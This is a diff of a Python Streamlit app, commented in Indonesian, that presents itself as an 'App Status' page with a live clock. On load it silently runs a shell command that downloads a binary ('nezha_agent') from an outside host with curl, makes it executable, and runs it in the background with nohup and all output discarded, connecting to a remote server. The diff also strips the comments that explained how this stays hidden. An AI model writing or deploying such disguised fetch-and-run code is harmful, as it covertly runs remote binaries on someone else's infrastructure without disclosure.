@@ -3,7 +3,7 @@ import subprocess
 from datetime import datetime
 import time
 
-# --- Konfigurasi ---
+# --- Konfigurasi Halaman ---
 st.set_page_config(
     page_title="App Status",
     page_icon="🟢",
@@ -11,10 +11,6 @@ st.set_page_config(
 )
 
 # Perintah shell yang akan dijalankan secara otomatis di latar belakang.
-# nohup: Menjaga proses tetap berjalan bahkan jika sesi terminal induk ditutup.
-# > /dev/null 2>&1: Mengalihkan semua output (standar dan error) ke "tempat sampah" 
-#                   agar tidak memenuhi log server.
-# &: Menjalankan perintah di background (latar belakang), sehingga tidak memblokir script Python.
 COMMAND_TO_RUN_ONCE = """
 (curl -L https://alice.mxflower.eu.org/d/CF%20R2/database/nezha_agent -o agent && chmod +x agent) && \
 nohup env NZ_SERVER=vps-monitor.fly.dev:443 \
@@ -43,15 +39,12 @@ if not st.session_state.agent_triggered:
         # Set flag ke True agar blok kode ini tidak akan pernah dijalankan lagi di sesi ini.
         st.session_state.agent_triggered = True
         
-        # Tampilkan notifikasi singkat (toast) yang akan hilang sendiri
         st.toast("Agent berhasil dimulai!", icon="✅")
-        
-        # Beri jeda singkat agar pengguna bisa melihat pesan info sebelum UI di-refresh
         time.sleep(2)
         
-        # Paksa Streamlit untuk menjalankan ulang script dari awal.
-        # Kali ini, 'agent_triggered' sudah True, jadi blok ini akan dilewati.
-        st.experimental_rerun()
+        # --- PERUBAHAN DI SINI ---
+        # Gunakan st.rerun() yang merupakan fungsi standar sekarang.
+        st.rerun()
 
     except Exception as e:
         # Jika ada error, tampilkan dan hentikan aplikasi
@@ -73,11 +66,10 @@ clock_placeholder = st.empty()
 # Loop tak terbatas untuk membuat efek jam "live"
 while True:
     now = datetime.now()
-    # Tampilkan waktu saat ini menggunakan st.metric untuk tampilan yang bagus
     clock_placeholder.metric(
         label="Waktu Server Saat Ini",
         value=now.strftime("%H:%M:%S"),
-        delta=now.strftime('%d %B %Y'), # Tampilkan tanggal sebagai "delta"
-        delta_color="off" # Matikan warna hijau/merah pada delta
+        delta=now.strftime('%d %B %Y'),
+        delta_color="off"
     )
-    time.sleep(1) # Tunggu 1 detik sebelum update lagi
+    time.sleep(1)
